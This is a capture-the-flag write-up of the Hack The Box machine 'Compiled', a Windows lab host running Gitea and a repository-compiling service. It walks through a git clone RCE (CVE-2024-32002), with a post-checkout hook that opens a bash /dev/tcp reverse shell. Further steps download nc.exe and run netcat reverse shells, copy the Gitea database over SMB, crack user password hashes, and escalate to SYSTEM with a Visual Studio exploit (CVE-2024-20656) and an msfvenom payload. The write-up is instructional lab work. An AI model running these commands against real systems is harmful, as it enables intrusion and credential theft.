# Nmap
```
# Nmap 7.95 scan initiated Sat Jul 26 14:54:50 2025 as: /usr/lib/nmap/nmap --privileged -sC -sV -Pn -oN ./nmap.txt 10.10.11.26
Nmap scan report for 10.10.11.26
Host is up (0.39s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
3000/tcp open  http    Golang net/http server
|_http-title: Git
| fingerprint-strings: 
|   GenericLines, Help, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Content-Type: text/html; charset=utf-8
|     Set-Cookie: i_like_gitea=cf4e58157228cad5; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=S4beFhdekkSiiBs3ymKhrH4wcQM6MTc1MzUwNTc5MTI2NDY3NzUwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Sat, 26 Jul 2025 04:56:31 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-arc-green">
|     <head>
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <title>Git</title>
|     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR2l0Iiwic2hvcnRfbmFtZSI6IkdpdCIsInN0YXJ0X3VybCI6Imh0dHA6Ly9naXRlYS5jb21waWxlZC5odGI6MzAwMC8iLCJpY29ucyI6W3sic3JjIjoiaHR0cDovL2dpdGVhLmNvbXBpbGVkLmh0YjozMDAwL2Fzc2V0cy9pbWcvbG9nby5wbmciLCJ0eXBlIjoiaW1hZ2UvcG5nIiwic2l6ZXMiOiI1MTJ4NTEyIn0seyJzcmMiOiJodHRwOi8vZ2l0ZWEuY29tcGlsZWQuaHRiOjMwMDA
|   HTTPOptions: 
|     HTTP/1.0 405 Method Not Allowed
|     Allow: HEAD
|     Allow: GET
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Set-Cookie: i_like_gitea=f79b2a4442fe569e; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=DFyykfrGH37MqE9T7tH5xR13O_o6MTc1MzUwNTc5MzE4ODUyMTgwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Sat, 26 Jul 2025 04:56:33 GMT
|_    Content-Length: 0
5000/tcp open  http    Werkzeug httpd 3.0.3 (Python 3.12.3)
|_http-title: Compiled - Code Compiling Services
|_http-server-header: Werkzeug/3.0.3 Python/3.12.3
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.95%I=7%D=7/26%Time=6884EC67%P=aarch64-unknown-linux-gn
SF:u%r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type
SF::\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x2
SF:0Bad\x20Request")%r(GetRequest,3000,"HTTP/1\.0\x20200\x20OK\r\nCache-Co
SF:ntrol:\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\
SF:nContent-Type:\x20text/html;\x20charset=utf-8\r\nSet-Cookie:\x20i_like_
SF:gitea=cf4e58157228cad5;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nSet-
SF:Cookie:\x20_csrf=S4beFhdekkSiiBs3ymKhrH4wcQM6MTc1MzUwNTc5MTI2NDY3NzUwMA
SF:;\x20Path=/;\x20Max-Age=86400;\x20HttpOnly;\x20SameSite=Lax\r\nX-Frame-
SF:Options:\x20SAMEORIGIN\r\nDate:\x20Sat,\x2026\x20Jul\x202025\x2004:56:3
SF:1\x20GMT\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en-US\"\x20class=\"
SF:theme-arc-green\">\n<head>\n\t<meta\x20name=\"viewport\"\x20content=\"w
SF:idth=device-width,\x20initial-scale=1\">\n\t<title>Git</title>\n\t<link
SF:\x20rel=\"manifest\"\x20href=\"data:application/json;base64,eyJuYW1lIjo
SF:iR2l0Iiwic2hvcnRfbmFtZSI6IkdpdCIsInN0YXJ0X3VybCI6Imh0dHA6Ly9naXRlYS5jb2
SF:1waWxlZC5odGI6MzAwMC8iLCJpY29ucyI6W3sic3JjIjoiaHR0cDovL2dpdGVhLmNvbXBpb
SF:GVkLmh0YjozMDAwL2Fzc2V0cy9pbWcvbG9nby5wbmciLCJ0eXBlIjoiaW1hZ2UvcG5nIiwi
SF:c2l6ZXMiOiI1MTJ4NTEyIn0seyJzcmMiOiJodHRwOi8vZ2l0ZWEuY29tcGlsZWQuaHRiOjM
SF:wMDA")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x
SF:20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Ba
SF:d\x20Request")%r(HTTPOptions,197,"HTTP/1\.0\x20405\x20Method\x20Not\x20
SF:Allowed\r\nAllow:\x20HEAD\r\nAllow:\x20GET\r\nCache-Control:\x20max-age
SF:=0,\x20private,\x20must-revalidate,\x20no-transform\r\nSet-Cookie:\x20i
SF:_like_gitea=f79b2a4442fe569e;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r
SF:\nSet-Cookie:\x20_csrf=DFyykfrGH37MqE9T7tH5xR13O_o6MTc1MzUwNTc5MzE4ODUy
SF:MTgwMA;\x20Path=/;\x20Max-Age=86400;\x20HttpOnly;\x20SameSite=Lax\r\nX-
SF:Frame-Options:\x20SAMEORIGIN\r\nDate:\x20Sat,\x2026\x20Jul\x202025\x200
SF:4:56:33\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequest,67,"HTTP
SF:/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20chars
SF:et=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jul 26 14:56:17 2025 -- 1 IP address (1 host up) scanned in 87.49 seconds
```

# Page Check
**Port 3000**
![](images/Pasted%20image%2020250726145826.png)
From the bottom of the page, we can find the version of `gitea`
```
[Powered by Gitea](https://about.gitea.com) Version: 1.21.6
```
There is a very typical `CVE-2024-6886`
![](images/Pasted%20image%2020250726150127.png)
We can find the vulnerable exploit detail in `exploit-db`
`https://www.exploit-db.com/exploits/52077`
![](images/Pasted%20image%2020250726150219.png)

From the Remote Repository we can find 2 project
![](images/Pasted%20image%2020250726150315.png)
From `Complied` project, we can know the port 5000 service can complie the GitHub repository.
![](images/Pasted%20image%2020250726150451.png)

The other project I guess would be a test application to test that function.
And we can also find the version of git is `2.45.0.windows.1`
![](images/Pasted%20image%2020250726151821.png)
Then we can search and get the vulnerable target
`https://github.com/amalmurali47/git_rce`
`CVE-2024-32002: Exploiting Git RCE via git clone`

**Port 5000**
![](images/Pasted%20image%2020250726150642.png)
That's what I said before, so let's try to complie the `Caculator` here.
![](images/Pasted%20image%2020250726150753.png)After that give us the successful message, but I can't see the result of complie

# CVE-2024-32002
```
https://amalmurali.me/posts/git-rce/
https://github.com/amalmurali47/git_rce
```
This blog can explain the exploit process clearly here.

Step 1: Create 2 Remote Repository: hook and captain
Create your own account and make these repository
![](images/Pasted%20image%2020250726152643.png)
Then clone `hook` to your local machine
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Compiled]
└─$ git clone http://10.10.11.26:3000/wither/hook.git        
Cloning into 'hook'...
warning: You appear to have cloned an empty repository.
                                                                                                                                                                                
┌──(wither㉿localhost)-[~/Templates/htb-labs/Compiled]
└─$ cd hook    

```

Step 2: create a `y/hooks` directory, and create a post-checkout script in it
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Compiled/hook]
└─$ mkdir -p y/hooks
                                                                                                                                                                                
┌──(wither㉿localhost)-[~/Templates/htb-labs/Compiled/hook]
└─$ nano y/hooks/post-checkout
                                                                                                                                                                                
┌──(wither㉿localhost)-[~/Templates/htb-labs/Compiled/hook]
└─$ chmod +x y/hooks/post-checkout         
                                                                                                                                                                                
┌──(wither㉿localhost)-[~/Templates/htb-labs/Compiled/hook]
└─$ cat y/hooks/post-checkout     
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.5/443 0>&1

```

Step 3: commit these changes and push them back to `Gitea`:
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Compiled/hook]
└─$ git add y/hooks/post-checkout
                                                                                                                                                                                
┌──(wither㉿localhost)-[~/Templates/htb-labs/Compiled/hook]
└─$ git commit -m "post-checkout"
[main (root-commit) 1bdd6c8] post-checkout
 1 file changed, 1 insertion(+)
 create mode 100755 y/hooks/post-checkout
                                                                                                                                                                                
┌──(wither㉿localhost)-[~/Templates/htb-labs/Compiled/hook]
└─$ git push                     
Username for 'http://10.10.11.26:3000': wither
Password for 'http://wither@10.10.11.26:3000': 
Enumerating objects: 5, done.
Counting objects: 100% (5/5), done.
Writing objects: 100% (5/5), 331 bytes | 331.00 KiB/s, done.
Total 5 (delta 0), reused 0 (delta 0), pack-reused 0 (from 0)
remote: . Processing 1 references
remote: Processed 1 references in total
To http://10.10.11.26:3000/wither/hook.git
 * [new branch]      main -> main

```

Step 4: clone a second `repo` named `captain` 
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Compiled]
└─$ git clone http://10.10.11.26:3000/wither/captain.git
Cloning into 'captain'...
warning: You appear to have cloned an empty repository.
                                                                                                                                                                                
┌──(wither㉿localhost)-[~/Templates/htb-labs/Compiled]
└─$ cd captain 
```

Step 5: add the `hook` `repo` as a `submodule`:
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Compiled/captain]
└─$ git submodule add --name x/y http://10.10.11.26:3000/wither/hook.git A/modules/x
Cloning into '/home/wither/Templates/htb-labs/Compiled/captain/A/modules/x'...
remote: Enumerating objects: 5, done.
remote: Counting objects: 100% (5/5), done.
remote: Total 5 (delta 0), reused 0 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (5/5), done.
                                                                                                                                                                                
┌──(wither㉿localhost)-[~/Templates/htb-labs/Compiled/captain]
└─$ git commit -m "add-submodule"
[main (root-commit) efe3354] add-submodule
 2 files changed, 4 insertions(+)
 create mode 100644 .gitmodules
 create mode 160000 A/modules/x

```

Step 6: create the git `symlink`:
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Compiled/captain]
└─$ printf ".git" > dotgit.txt
                                                                                                                                                                                
┌──(wither㉿localhost)-[~/Templates/htb-labs/Compiled/captain]
└─$ git hash-object -w --stdin < dotgit.txt > dot-git.hash
                                                                                                                                                                                
┌──(wither㉿localhost)-[~/Templates/htb-labs/Compiled/captain]
└─$ printf "120000 %s 0\ta\n" "$(cat dot-git.hash)" > index.info
                                                                                                                                                                                
┌──(wither㉿localhost)-[~/Templates/htb-labs/Compiled/captain]
└─$ git update-index --index-info < index.info

```

Step 7: commit all this and push it back to `Gitea`
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Compiled/captain]
└─$ git commit -m "add-symlink"
[main db7ed38] add-symlink
 1 file changed, 1 insertion(+)
 create mode 120000 a
                                                                                                                                                                                
┌──(wither㉿localhost)-[~/Templates/htb-labs/Compiled/captain]
└─$ git push
Username for 'http://10.10.11.26:3000': wither
Password for 'http://wither@10.10.11.26:3000': 
Enumerating objects: 8, done.
Counting objects: 100% (8/8), done.
Delta compression using up to 2 threads
Compressing objects: 100% (5/5), done.
Writing objects: 100% (8/8), 602 bytes | 602.00 KiB/s, done.
Total 8 (delta 1), reused 0 (delta 0), pack-reused 0 (from 0)
remote: . Processing 1 references
remote: Processed 1 references in total
To http://10.10.11.26:3000/wither/captain.git
 * [new branch]      main -> main

```

Step 8 : grab the link to the `captain` `repo` and submit it to the service on port 5000
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Compiled]
└─$ nc -lnvp 8001                              
listening on [any] 8001 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.11.26] 52664

Richard@COMPILED MINGW64 ~/source/cloned_repos/bomzm/.git/modules/x ((79ee27b...))
$ id
id
uid=197610(Richard) gid=197121 groups=197121
```

This is a git command line, we want to get the `powershell` here. I will upload a `nc.exe` to help us get the reverse shell
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Compiled]
└─$ ls /opt/nc                   
Makefile  doexec.c  generic.h  getopt.c  getopt.h  hobbit.txt  license.txt  nc.exe  nc64.exe  netcat.c  readme.txt  shell.bat
                                                                                                                                                                                
┌──(wither㉿localhost)-[~/Templates/htb-labs/Compiled]
└─$ cd /opt/nc
                                                                                                                                                                                
┌──(wither㉿localhost)-[/opt/nc]
└─$ python3 -m http.server 80                                                                                                               
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.26 - - [26/Jul/2025 15:55:15] "GET /nc.exe HTTP/1.1" 200 -
10.10.11.26 - - [26/Jul/2025 15:55:30] "GET /nc.exe HTTP/1.1" 200 -
```

Then from the target machine
```
Richard@COMPILED MINGW64 /c/programdata
$ pwd
pwd
/c/programdata

Richard@COMPILED MINGW64 /c/programdata
$ curl 10.10.14.5/nc.exe -o ./nc.exe
curl 10.10.14.5/nc.exe -o ./nc.exe

Richard@COMPILED MINGW64 /c/programdata
$ dir
dir
Datos\ de\ programa        Package\ Cache        WindowsHolographicDevices
Documentos                 Packages              nc.exe
Escritorio                 Plantillas            ntuser.pol
Menú\ Inicio               SoftwareDistribution  regid.1991-06.com.microsoft
Microsoft                  USOPrivate            ssh
Microsoft\ OneDrive        USOShared
Microsoft\ Visual\ Studio  VMware

Richard@COMPILED MINGW64 /c/programdata
$ ./nc.exe -e cmd.exe 10.10.14.5 443
./nc.exe -e cmd.exe 10.10.14.5 443

```

Then we can get the reverse shell of `Richard`
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Compiled]
└─$ nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.11.26] 52673
Microsoft Windows [Version 10.0.19045.4651]
(c) Microsoft Corporation. All rights reserved.

C:\programdata>whoami
whoami
Richard

C:\programdata>

```

# shell as emily
Enumerate the file system, we can find a `gitea.db`
```
C:\Program Files\Gitea\data>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 352B-98C6

 Directory of C:\Program Files\Gitea\data

07/26/2025  07:57 AM    <DIR>          .
07/26/2025  07:57 AM    <DIR>          ..
05/22/2024  08:08 PM    <DIR>          actions_artifacts
05/22/2024  08:08 PM    <DIR>          actions_log
05/22/2024  08:08 PM    <DIR>          attachments
05/22/2024  08:08 PM    <DIR>          avatars
07/26/2025  07:30 AM    <DIR>          gitea-repositories
07/26/2025  07:57 AM         2,023,424 gitea.db
05/22/2024  08:08 PM    <DIR>          home
05/22/2024  08:08 PM    <DIR>          indexers
05/22/2024  08:08 PM    <DIR>          jwt
05/22/2024  08:08 PM    <DIR>          lfs
05/22/2024  08:08 PM    <DIR>          packages
05/22/2024  08:08 PM    <DIR>          queues
05/22/2024  08:08 PM    <DIR>          repo-archive
05/22/2024  08:08 PM    <DIR>          repo-avatars
07/26/2025  07:14 AM    <DIR>          sessions
05/24/2024  05:32 PM    <DIR>          tmp
               1 File(s)      2,023,424 bytes
              17 Dir(s)  10,428,272,640 bytes free

```

Let's download it to our local machine
Firstly open the `smb` service on the local machine 
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Compiled]
└─$ smbserver.py share . -username wither -password wither -smb2support
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.11.26,52678)
[*] AUTHENTICATE_MESSAGE (\wither,COMPILED)
[*] User COMPILED\wither authenticated successfully
[*] wither:::aaaaaaaaaaaaaaaa:151d5d52463068a9a83cc996d13a1628:01010000000000008012bc2447fedb01b0e052fab4827d4100000000010010004d006b005800410067006b0073006100030010004d006b005800410067006b0073006100020010004600720072004c005200790051005500040010004600720072004c005200790051005500070008008012bc2447fedb0106000400020000000800300030000000000000000000000000200000a5a97a6b46103864de6aab1f5dec5adbb2e631b8f6698a032cc399166f23cba10a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e0035000000000000000000
```
Then connect to `smb` and copy the database to that
```
C:\Program Files\Gitea\data>net use \\10.10.14.5\share /u:wither wither
net use \\10.10.14.5\share /u:wither wither
The command completed successfully.

C:\Program Files\Gitea>copy "data\gitea.db" "\\10.10.14.5\share\gitea.db"

copy "data\gitea.db" "\\10.10.14.5\share\gitea.db"
        1 file(s) copied.

```

Then use `sqlite3` to check the database, we find the credit of `administrator` and `emily`
```
sqlite> select * from user;
1|administrator|administrator||administrator@compiled.htb|0|enabled|1bf0a9561cf076c5fc0d76e140788a91b5281609c384791839fd6e9996d3bbf5c91b8eee6bd5081e42085ed0be779c2ef86d|pbkdf2$50000$50|0|0|0||0|||6e1a6f3adbe7eab92978627431fd2984|a45c43d36dce3076158b19c2c696ef7b|en-US||1716401383|1716669640|1716669640|0|-1|1|1|0|0|0|1|0||administrator@compiled.htb|0|0|0|0|0|0|0|0|0||arc-green|0
2|richard|richard||richard@compiled.htb|0|enabled|4b4b53766fe946e7e291b106fcd6f4962934116ec9ac78a99b3bf6b06cf8568aaedd267ec02b39aeb244d83fb8b89c243b5e|pbkdf2$50000$50|0|0|0||0|||2be54ff86f147c6cb9b55c8061d82d03|d7cf2c96277dd16d95ed5c33bb524b62|en-US||1716401466|1720089561|1720089548|0|-1|1|0|0|0|0|1|0||richard@compiled.htb|0|0|0|0|2|0|0|0|0||arc-green|0
4|emily|emily||emily@compiled.htb|0|enabled|97907280dc24fe517c43475bd218bfad56c25d4d11037d8b6da440efd4d691adfead40330b2aa6aaf1f33621d0d73228fc16|pbkdf2$50000$50|1|0|0||0|||0056552f6f2df0015762a4419b0748de|227d873cca89103cd83a976bdac52486|||1716565398|1716567763|0|0|-1|1|0|0|0|0|1|0||emily@compiled.htb|0|0|0|0|0|0|0|2|0||arc-green|0
6|wither|wither||wither@test.com|0|enabled|b422e31664285ab40e2e9bac817c57db61687c859174302a43a15772b8bb59c9c3d978364b123c9ce0d7f5534c1c441dbdb3|pbkdf2$50000$50|0|0|0||0|||fec14fa2fbdb22ea4ed0ca77cf55eda4|d9b5644c457adef02e1491dfda0fa073|en-US||1753506862|1753509288|1753507785|0|-1|1|0|0|0|0|1|0||wither@test.com|0|0|0|0|3|0|0|0|0|unified|arc-green|0
sqlite> 

```

We need to create the format of hash to crack
![](images/Pasted%20image%2020250726161210.png)
So the hashes would be
```
administrator:sha256:50000:pFxD023OMHYVixnCxpbvew==:G/CpVhzwdsX8DXbhQHiKkbUoFgnDhHkYOf1umZbTu/XJG47ua9UIHkIIXtC+d5wu+G0=
richard:sha256:50000:188slid90W2V7Vwzu1JLYg==:S0tTdm/pRufikbEG/Nb0lik0EW7JrHipmzv2sGz4Voqu3SZ+wCs5rrJE2D+4uJwkO14=
emily:sha256:50000:In2HPMqJEDzYOpdr2sUkhg==:l5BygNwk/lF8Q0db0hi/rVbCXU0RA32LbaRA79TWka3+rUAzCyqmqvHzNiHQ1zIo/BY=
```

We can use `john` to crack the password of `emily`
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Compiled]
└─$ hashcat emily.hash /usr/share/wordlists/rockyou.txt --show
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

10900 | PBKDF2-HMAC-SHA256 | Generic KDF

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

sha256:50000:In2HPMqJEDzYOpdr2sUkhg==:l5BygNwk/lF8Q0db0hi/rVbCXU0RA32LbaRA79TWka3+rUAzCyqmqvHzNiHQ1zIo/BY=:12345678
```

Then we can use `evil-winrm` to connect it
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Compiled]
└─$ evil-winrm -i 10.10.11.26 -u emily -p 12345678                                  
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Emily\Documents> 

```

# Privilege Escalation
`Visual Studio 2019` is in the `C:\Users\Emily\Documents`
So I guess there would be something vulnerable with that
```
CVE-2024-20656 – Local Privilege Escalation in the VSStandardCollectorService150 Service
https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/
```

In the bottom of this blog, there is a summary of exploit process
```
With this we have all pieces for our exploit, to summarise:

Create a dummy directory where the VSStandardCollectorService150 will write files.
Create a junction directory that points to a newly created directory.
Trigger the VSStandardCollectorService150 service by creating a new diagnostic session.
Wait for the <GUID>.scratch directory to be created and create new object manager symbolic link Report.<GUID>.diagsession that points to C:\\ProgramData .
Stop the diagnostic session.
Wait for the Report.<GUID>.diagsession file to be moved to the parent directory and switch the junction directory to point to \\RPC Control where our symbolic link is waiting.
Sleep for 5 seconds (not really important but left it there).
Switch the junction directory to point to a dummy directory.
Start a new diagnostic session.
Wait for <GUID>.scratch directory to be created and create a new object manager symbolic link Report.<GUID>.diagsession that points to C:\\ProgramData\\Microsoft
Stop the diagnostic session.
Wait for the Report.<GUID>.diagsession file to be moved to parent directory and switch the junction directory to point to \\RPC Control where our symbolic link is waiting.
After the permissions are changed we delete the C:\\ProgramData\\Microsoft\\VisualStudio\\SetupWMI\\MofCompiler.exe binary.
Locate and run the Setup WMI provider in repair mode.
Wait for our new MofCompiler.exe binary to be created by the installer and replace it with cmd.exe
Enjoy SYSTEM shell 🙂
```

`https://github.com/Wh04m1001/CVE-2024-20656.git`
Here is the `poc` exploit, but we need to change something to make sure it will runs normally
```
*Evil-WinRM* PS C:\Program Files (x86)\Microsoft Visual Studio\2019> dir


    Directory: C:\Program Files (x86)\Microsoft Visual Studio\2019


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         1/20/2024   2:16 AM                Community
```
The target machine's `visual studio` is version 2019 and in the `C:\Program Files (x86)`
change `main.cpp`
![](images/Pasted%20image%2020250726162337.png)

Inside the `cb1() `method we can see that it is copying `c:\windows\system32\cmd.exe` to the file
that is going to be executed. However, we want to run out reverse shell payload. Thus let us
change the source file of the copy operation to our payload file `c:\programdata\shell.exe`.
![](images/Pasted%20image%2020250726162749.png)

Then let's `complie` the `release` version

In this place, we need three files to Compiled to make this work
First, I’ll need a reverse shell binary, which I’ll generate with `msfvenom`
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Compiled]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f exe -o rev-443.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: rev-443.exe

```

I’m going to upload that and `Expl.exe`, `RunasCs.exe` to Compiled 
```
*Evil-WinRM* PS C:\programdata> upload Expl.exe
                                        
Info: Uploading /home/wither/Templates/htb-labs/Compiled/Expl.exe to C:\programdata\Expl.exe
                                        
Data: 229376 bytes of 229376 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\programdata> upload rev-443.exe
                                        
Info: Uploading /home/wither/Templates/htb-labs/Compiled/rev-443.exe to C:\programdata\rev-443.exe
                                        
Data: 9556 bytes of 9556 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\programdata> upload ../../../../../opt/RunasCs.exe
                                        
Info: Uploading /home/wither/Templates/htb-labs/Compiled/../../../../../opt/RunasCs.exe to C:\programdata\RunasCs.exe
                                        
Data: 68948 bytes of 68948 bytes copied
                                        
Info: Upload successful!

```

Then let's exploit them
```
*Evil-WinRM* PS C:\programdata> .\RunasCs.exe Emily 12345678 'C:\Programdata\e.exe'

[+] Junction \\?\C:\c2cb7808-2bfb-4b45-868d-9e00a21ad6dd -> \??\C:\00a2ec86-5840-4b82-bec8-390d2b423ff6 created!
[+] Symlink Global\GLOBALROOT\RPC Control\Report.0197E42F-003D-4F91-A845-6404CF289E84.diagsession -> \??\C:\Programdata created!
[+] Junction \\?\C:\c2cb7808-2bfb-4b45-868d-9e00a21ad6dd -> \RPC Control created!
[+] Junction \\?\C:\c2cb7808-2bfb-4b45-868d-9e00a21ad6dd -> \??\C:\00a2ec86-5840-4b82-bec8-390d2b423ff6 created!
[+] Symlink Global\GLOBALROOT\RPC Control\Report.0297E42F-003D-4F91-A845-6404CF289E84.diagsession -> \??\C:\Programdata\Microsoft created!
[+] Junction \\?\C:\c2cb7808-2bfb-4b45-868d-9e00a21ad6dd -> \RPC Control created!
[+] Persmissions successfully reseted!
[*] Starting WMI installer.
[*] Command to execute: C:\windows\system32\msiexec.exe /fa C:\windows\installer\8ad86.msi
[*] Oplock!
[+] File moved!
```

Then you can get the reverse shell
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Compiled]
└─$ nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.11.26] 52680
Microsoft Windows [Versi�n 10.0.19045.4651]
(c) Microsoft Corporation. Todos los derechos reservados.

C:\ProgramData\Microsoft\VisualStudio\SetupWMI>cd C:\
cd C:\

C:\>whoami
whoami
nt authority\system
```

# Description

It mainly exploited the `CVE-2024-32002` vulnerability of git to gain a foothold, then enumerated the `gitea` database to obtain the credentials of other users. Finally, it used `CVE-2024-20656` to escalate permissions.